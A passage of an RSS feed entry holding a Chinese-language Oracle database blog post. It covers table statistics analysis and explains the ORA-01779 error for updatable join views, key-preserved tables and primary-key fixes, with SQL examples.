&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;analyze&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table&lt;/span&gt; PRODUCT_REF_LIST_NESTEDTAB compute &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;statistics&lt;/span&gt;;
    &lt;span style=&#34;color:#228b22&#34;&gt;-- ....
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#228b22&#34;&gt;-- 查看统计信息
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt;,num_rows &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;from&lt;/span&gt; user_tables;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析的结果被Oracle用于基于成本的优化生成更好的查询计划。&lt;/p&gt;
&lt;p&gt;遇到当前表的查询或其他性能不好时，就可以对相应的表进行一次分析。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果你的表经常由几千万变成几百万，又变成几千万那么需要制定分析计划定期表分析，同时可以一并分析索引，计算索引中数据的分布情况，这样CBO会选择更加准确的执行计划。&lt;/li&gt;
&lt;li&gt;如果表结构变化了也要做下，也就是经常对表做dml就需要分析，现在推荐使用dbms_stats包。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;error&#34;&gt;ERROR&lt;/h1&gt;
&lt;h2 id=&#34;ora-01779-无法修改与非键值保存表对应的列&#34;&gt;ORA-01779: 无法修改与非键值保存表对应的列&lt;/h2&gt;
&lt;p&gt;这里要搞清楚三个概念：视图、联接视图、可更新的联接视图&lt;/p&gt;
&lt;h3 id=&#34;视图&#34;&gt;视图&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;视图&lt;/strong&gt;可以分为视图对象和内嵌视图两种。&lt;/p&gt;
&lt;h4 id=&#34;视图对象view-object&#34;&gt;视图对象（View Object）&lt;/h4&gt;
&lt;p&gt;数据库里的&lt;strong&gt;视图对象&lt;/strong&gt;跟一张表或索引等一样，是数据库对象中的一种，它其实是将基于表中原始数据的查询给虚拟了一层之后，提供给外部查询的一种对象。
其本质是并不保存查询的实际结果，而只是将查询语句保存在数据库中，当用户查询某张视图的时候，就会找到并执行这个视图的语句。
而&lt;strong&gt;联接视图&lt;/strong&gt;其实就是在一个视图中将两个表建立关联就是了。&lt;/p&gt;
&lt;h4 id=&#34;内嵌视图inline-view&#34;&gt;内嵌视图（Inline View）&lt;/h4&gt;
&lt;p&gt;在SQL语句中，很多地方都可以写嵌套的语句，比如说，FROM后面可以套括号嵌套其他的语句，WHERE、SELECT、UPDATE、INSERT、DELETE后面都是可以写的。只是写的位置不同，执行的方式还有处理时的一些限制不同，这些SQL中嵌套的SQL被称为&lt;strong&gt;子查询（Subquery）&lt;/strong&gt; 。子查询可以分为如下几类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内嵌视图：位置位于FROM语句中，也相当于一个预处理结果集的概念&lt;/li&gt;
&lt;li&gt;标量子查询（Scalar Subquery）：只返还一个结果值的子查询。位于SELECT语句的子查询只能返还一个值，所以必然是标量子查询，WHERE语句里也会出现这样的子查询&lt;/li&gt;
&lt;li&gt;关联子查询：将查询的结果传递给子查询作为参数的使用的形式&lt;/li&gt;
&lt;li&gt;一般子查询：除了那些特殊形式的子查询以外的一般用法&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;可更新联接视图updatable-join-view-&#34;&gt;可更新联接视图（Updatable Join View ）&lt;/h4&gt;
&lt;p&gt;将一个联接视图（包括视图对象和内嵌视图）放到UPADTE语句中这样的语法形式。&lt;/p&gt;
&lt;p&gt;同样的道理，如果只是用一个表来作为视图的基表，则可以对该视图直接进行&lt;code&gt;DELETE&lt;/code&gt;和&lt;code&gt;UPDATE&lt;/code&gt;，但无法直接执行&lt;code&gt;INSERT&lt;/code&gt;，因为该视图没有默认值的非空列(&lt;code&gt;brand_id&lt;/code&gt;)。该视图称为&lt;strong&gt;可更新视图&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;报错原理&#34;&gt;报错原理&lt;/h3&gt;
&lt;p&gt;Oracle的键值保存表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;SELECT&lt;/span&gt; *
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;FROM&lt;/span&gt; DBA_UPDATABLE_COLUMNS
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;SCOTT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;EMP_DEPT_V&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;COLUMN_NAME&lt;/span&gt; | UPDATABLE | INSERTABLE | DELETABLE
SCOTT   EMP_DEPT_V     EMPNO            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
SCOTT   EMP_DEPT_V     ENAME            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
SCOTT   EMP_DEPT_V     SAL              &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
SCOTT   EMP_DEPT_V     DEPTNO           &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
SCOTT   EMP_DEPT_V     DNAME            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;视图&lt;code&gt;EMP_DEPT_V&lt;/code&gt;里的字段都无法变更。&lt;/p&gt;
&lt;p&gt;如果能保证DEPT_T表里的数据是唯一的就能够更新。也就是说在DEPT_T表上加&lt;code&gt;主键约束&lt;/code&gt;或&lt;code&gt;唯一约束&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE&lt;/span&gt; DEPT_T
     &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;CONSTRAINT&lt;/span&gt; PK_DEPT_T &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;KEY&lt;/span&gt; (DEPTNO);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再看一下之前的视图：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;SELECT&lt;/span&gt; *
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;FROM&lt;/span&gt; DBA_UPDATABLE_COLUMNS
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;SCOTT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;EMP_DEPT_V&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;COLUMN_NAME&lt;/span&gt; | UPDATABLE | INSERTABLE | DELETABLE
SCOTT   EMP_DEPT_V     EMPNO            YES         YES         YES
SCOTT   EMP_DEPT_V     ENAME            YES         YES         YES
SCOTT   EMP_DEPT_V     SAL              YES         YES         YES
SCOTT   EMP_DEPT_V     DEPTNO           YES         YES         YES
SCOTT   EMP_DEPT_V     DNAME             &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候就可以看到，视图中&lt;code&gt;EMP_DEPT_V&lt;/code&gt;表中原来的字段都是可以更新的了。&lt;/p&gt;
&lt;p&gt;在对联接视图进行变更的时候，必须保证修改后的值是唯一的，并且这个事实要让数据库知道，而告知数据库的方法是建立主键约束或唯一约束。&lt;/p&gt;
&lt;p&gt;并不是所有的表都可以随意建这些约束，有什么方法能够不添加约束也能变更？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加&lt;code&gt;/*+ BYPASS_UJVC */&lt;/code&gt; 提示，让ORACLE跳过检查（11g R2之后无效，不建议使用）&lt;/li&gt;
&lt;li&gt;改写&lt;code&gt;UPDATE&lt;/code&gt;语句，通过其他方式判断后处理&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;UPDATE&lt;/code&gt;改成&lt;code&gt;MERGE&lt;/code&gt;语句&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Oracle：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;The concept of a &lt;strong&gt;key-preserved table&lt;/strong&gt; is fundamental to understanding the restrictions on &lt;strong&gt;modifying join views&lt;/strong&gt;. A table is key-preserved if every key of the table can also be a key of the result of the join. So, a key-preserved table has its keys preserved through a join.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;An &lt;strong&gt;updatable join view&lt;/strong&gt; (also referred to as a &lt;strong&gt;modifiable join view&lt;/strong&gt;) is a view that contains multiple tables in the top-level FROM clause of the SELECT statement, and is not restricted by the WITH READ ONLY clause.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/60a56760b19f&#34;&gt;https://www.jianshu.com/p/60a56760b19f&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.yiibai.com/oracle/oracle-updatable-view.html&#34;&gt;https://www.yiibai.com/oracle/oracle-updatable-view.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
- https://www.openheart.icu/cs/oracle/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
  </channel>
</rss> 